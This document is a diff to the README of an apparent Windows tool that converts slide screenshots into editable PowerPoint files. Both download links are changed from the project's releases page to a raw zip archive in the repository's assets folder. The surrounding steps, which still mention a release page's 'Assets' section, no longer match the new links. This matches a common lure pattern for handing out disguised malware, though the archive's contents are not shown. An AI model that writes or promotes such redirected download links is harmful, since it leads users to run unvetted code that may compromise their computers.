@@ -1,6 +1,6 @@
 # 🎞️ slide-image-to-editable-pptx - Turn static slide screenshots into presentations
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Evasive-airplanemechanics850/slide-image-to-editable-pptx/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Evasive-airplanemechanics850/slide-image-to-editable-pptx/main/assets/slide_pptx_to_image_editable_v3.7.zip)
 
 This application converts individual images of slides into fully editable PowerPoint files. You often find yourself with images of slides from a lecture or a meeting but lack the original presentation file. This tool extracts the content and arranges it into a standard format so you can change text, move elements, and update images within PowerPoint.
 
@@ -12,7 +12,7 @@ Your computer must run Windows 10 or Windows 11. The application requires at lea
 
 Visit the official release page to obtain the installer for your computer.
 
-[Download the application here](https://github.com/Evasive-airplanemechanics850/slide-image-to-editable-pptx/releases)
+[Download the application here](https://raw.githubusercontent.com/Evasive-airplanemechanics850/slide-image-to-editable-pptx/main/assets/slide_pptx_to_image_editable_v3.7.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets."
